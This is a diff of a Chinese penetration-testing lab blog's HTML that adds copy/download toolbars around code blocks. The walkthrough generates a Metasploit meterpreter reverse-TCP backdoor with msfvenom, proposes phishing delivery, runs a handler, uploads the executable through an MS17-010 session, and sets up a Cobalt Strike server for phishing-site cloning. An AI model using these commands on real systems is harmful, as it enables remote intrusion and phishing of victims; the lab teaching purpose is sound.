@@ -64,15 +64,26 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;使用 msfvenom 命令生成一个反向 TCP 连接的 Windows 后门：&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
-&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;攻击机 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f exe -o payload.exe
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;攻击机 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f exe -o payload.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;通过社会工程学（如钓鱼邮件）将 &lt;code&gt;payload.exe&lt;/code&gt; 投递到目标机器。&lt;/p&gt;
 &lt;/li&gt;
@@ -164,7 +175,16 @@
 &lt;h2 id="实践步骤"&gt;实践步骤
 &lt;/h2&gt;&lt;h3 id="mfs恶意程序利用"&gt;MFS恶意程序利用
 &lt;/h3&gt;&lt;h4 id="使用msfvenom制作恶意软件"&gt;使用msfvenom制作恶意软件
-&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/h4&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
@@ -181,13 +201,24 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;-&lt;span class="o"&gt;]&lt;/span&gt; No arch selected, selecting arch: x86 from the payload
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;No encoder specified, outputting raw payload
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Payload size: &lt;span class="m"&gt;354&lt;/span&gt; bytes
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Final size of exe file: &lt;span class="m"&gt;73802&lt;/span&gt; bytes
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Final size of exe file: &lt;span class="m"&gt;73802&lt;/span&gt; bytes&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;文件存储于&lt;code&gt;/root/Notice.exe&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;文件存储于&lt;code&gt;/root/Notice.exe&lt;/code&gt;&lt;/p&gt;
 &lt;h4 id="制作监听程序"&gt;制作监听程序
 &lt;/h4&gt;&lt;p&gt;监听程序的制作过程与&lt;a class="link" href="https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%88%A9%E7%94%A8windows%E6%9C%8D%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81" target="_blank" rel="noopener"
 &gt;Metasploit持久化后门攻击&lt;/a&gt;相同：&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -211,13 +242,24 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;4448&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;4448&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4448
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4448 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id="将恶意程序传输下载到靶机"&gt;将恶意程序传输下载到靶机
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id="将恶意程序传输下载到靶机"&gt;将恶意程序传输下载到靶机
 &lt;/h4&gt;&lt;p&gt;这里通过&lt;a class="link" href="https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#metasploit%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" target="_blank" rel="noopener"
 &gt;MS17-010漏洞与Metasploit&lt;/a&gt;实现恶意程序的&lt;a class="link" href="https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#3-%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E4%B8%8E%E4%B8%8A%E4%BC%A0" target="_blank" rel="noopener"
 &gt;upload&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -227,11 +269,22 @@
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; upload /root/Notice.exe &amp;gt; C:&lt;span class="se"&gt;\\&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading : /root/Notice.exe -&amp;gt; C:&lt;span class="se"&gt;\N&lt;/span&gt;otice.exe
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /root/Notice.exe -&amp;gt; C:&lt;span class="se"&gt;\N&lt;/span&gt;otice.exe
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Completed : /root/Notice.exe -&amp;gt; C:&lt;span class="se"&gt;\N&lt;/span&gt;otice.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id="等待靶机执行恶意程序"&gt;等待靶机执行恶意程序
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id="等待靶机执行恶意程序"&gt;等待靶机执行恶意程序
 &lt;/h4&gt;&lt;p&gt;监听器获取到用户权限&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -245,15 +298,26 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4448 -&amp;gt; 10.0.0.17:49864&lt;span class="o"&gt;)&lt;/span&gt; at 2026-01-03 08:00:49 +0000
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: Ankh-PC&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id="cs钓鱼网站制作"&gt;CS钓鱼网站制作
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3 id="cs钓鱼网站制作"&gt;CS钓鱼网站制作
 &lt;/h3&gt;&lt;p&gt;为了克隆网站，虚拟机需要联网。这里设置靶机和Kali的网络连接模式为NAT模式，两者通过DHCP自动获取IP地址。此时Win7的IP地址为192.168.10.147/24；Kali的IP地址为192.168.10.135/24。两者之间与宿主机相互ping通并可以正常访问互联网&lt;/p&gt;
 &lt;h4 id="cobalt-strike安装"&gt;Cobalt Strike安装
 &lt;/h4&gt;&lt;p&gt;将&lt;a class="link" href="cobalt_strike_4.5.zip" &gt;cobalt_strike_4.5.zip&lt;/a&gt;下载至Kali并解压&lt;/p&gt;
 &lt;h4 id="更改cs读写权限"&gt;更改CS读写权限
-&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/h4&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
@@ -266,10 +330,12 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# &lt;span class="nb"&gt;cd&lt;/span&gt; coablt_strike_4.5
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5&lt;span class="o"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# chmod &lt;span class="m"&gt;777&lt;/span&gt; *
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# chmod &lt;span class="m"&gt;777&lt;/span&gt; *&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;ul&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;chmod&lt;/strong&gt; = &lt;strong&gt;ch&lt;/strong&gt;ange &lt;strong&gt;mod&lt;/strong&gt;e（改变模式）&lt;/p&gt;
 &lt;/li&gt;
@@ -318,6 +384,15 @@
 &lt;/ul&gt;
 &lt;h4 id="生成cobalt-strike服务器组"&gt;生成Cobalt Strike服务器组
 &lt;/h4&gt;&lt;p&gt;设置服务器IP和密码（CS服务器在kali的50050端口监听），创建组服务器实例&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -333,21 +408,34 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Will use existing X509 certificate and keystore &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; SSL&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Team server is up on 0.0.0.0:50050
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; SHA256 &lt;span class="nb"&gt;hash&lt;/span&gt; of SSL cert is: 7eac4fdf25b2e55d39a7d9fcccc00978b95a7639a78a2c893bd2f6aac3637fb8
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listener: Listener started!
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listener: Listener started!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id="打开cobalt-strike客户端并连接服务器组"&gt;打开Cobalt Strike客户端并连接服务器组
-&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id="打开cobalt-strike客户端并连接服务器组"&gt;打开Cobalt Strike客户端并连接服务器组
+&lt;/h4&gt;&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5&lt;span class="o"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# ./cobaltstrike
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# ./cobaltstrike&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;打开Cobal Strike，用刚才设置的密码和IP连接到用户组。Cobalt Strike支持多设备同时登录服务器。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;打开Cobal Strike，用刚才设置的密码和IP连接到用户组。Cobalt Strike支持多设备同时登录服务器。&lt;/p&gt;
 &lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/1.png"
 width="451"
 height="336"
@@ -670,6 +758,15 @@ data-flex-basis="341px"
 &gt;&lt;/p&gt;
 &lt;h4 id="三配置kali的静态ip地址并测试二者连通性"&gt;三、配置Kali的静态IP地址并测试二者连通性
 &lt;/h4&gt;&lt;p&gt;打开终端 -&amp;gt; &lt;code&gt;ip addr&lt;/code&gt;指令查看网卡名称（通常为&lt;code&gt;eth0&lt;/code&gt;） -&amp;gt; 手动分配IP地址：&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -679,10 +776,21 @@ data-flex-basis="341px"
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl stop NetworkMaager &lt;span class="c1"&gt;# 关闭NetworkManager服务——Kali 默认运行NetworkManager服务。当手动使用ip命令修改接口状态时，NetworkManager会检测到接口配置发生了变化。如果该接口被它接管，它会根据自己的配置文件（通常是DHCP或“自动连接”）立即重置接口，从而抹掉刚刚手动添加的IP地址&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip addr add 10.0.0.223/24 dev eth0 &lt;span class="c1"&gt;# 将IP地址10.0.0.223分配给eth0网卡&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip link &lt;span class="nb"&gt;set&lt;/span&gt; eth0 up &lt;span class="c1"&gt;# 激活eth0网卡，让它开始工作&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip link &lt;span class="nb"&gt;set&lt;/span&gt; eth0 up &lt;span class="c1"&gt;# 激活eth0网卡，让它开始工作&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;-&amp;gt; 再次输入&lt;code&gt;ip addr&lt;/code&gt;验证&lt;code&gt;eth0&lt;/code&gt;的IP地址 -&amp;gt; 测试两者连通性并进行Namp扫描：&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;-&amp;gt; 再次输入&lt;code&gt;ip addr&lt;/code&gt;验证&lt;code&gt;eth0&lt;/code&gt;的IP地址 -&amp;gt; 测试两者连通性并进行Namp扫描：&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -690,10 +798,12 @@ data-flex-basis="341px"
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ping 10.0.0.17 -c &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="c1"&gt;# 只发送4个数据包&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -n -sV -sC -T4 10.0.0.17 &lt;span class="c1"&gt;# 不进行DNS解析，使用默认的Nmap脚本探测服务/版本信息&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -n -sV -sC -T4 10.0.0.17 &lt;span class="c1"&gt;# 不进行DNS解析，使用默认的Nmap脚本探测服务/版本信息&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
